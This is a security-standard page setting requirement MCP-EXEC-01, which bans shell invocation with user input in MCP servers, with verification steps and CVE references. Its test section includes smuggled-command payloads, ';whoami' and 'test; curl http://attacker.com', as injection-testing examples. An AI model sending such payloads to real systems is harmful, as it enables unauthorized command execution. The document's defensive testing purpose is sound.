---
title: "MCP-EXEC-01 — Prohibition of Shell Execution"
weight: 21
---

# MCP-EXEC-01 — Prohibition of Shell Execution

**Level:** L1  
**Domain:** EXEC  

## Requirement

MCP servers MUST NOT use shell invocation (e.g., `os.system()`, `subprocess.run(shell=True)`, `child_process.exec()`) with user-controlled input. Use parameterized execution instead.

## Rationale

Shell metacharacters (`; | & $ ( )`) allow command injection, leading to arbitrary code execution.

## Scope

All tools that execute commands or spawn processes.

## Required Evidence

1. Code review showing use of `subprocess.run([cmd, arg1, arg2], shell=False)` or equivalent
2. No instances of `os.system()`, `shell=True`, or string-based exec
3. Test: input with `;whoami` does not execute `whoami`

## Verification Guidance

### Static
- Grep for `os.system`, `shell=True`, `exec(`, `eval(`
- Verify all command execution uses array/list of arguments

### Dynamic
- Submit tool invocation with payload: `test; curl http://attacker.com`
- Verify no outbound connection occurs

## Mappings

- CWE: CWE-78 (OS Command Injection)
- OWASP Top 10: A03:2021 – Injection
- OWASP MCP Top 10: MCP-05 (Command Injection & Execution)

## Exceptions & Compensating Controls

NOT_APPLICABLE: Server has no command execution capabilities.
Compensating: Strict input allowlist (alphanumeric only) MAY be acceptable at L1 but NOT recommended.

## References

- CVE-2025-61492: Command injection in terminal-controller-mcp
- CVE-2025-5277: Command injection in aws-mcp-server
- Trail of Bits: "Prompt Injection to RCE in AI Agents" (Oct 2025)
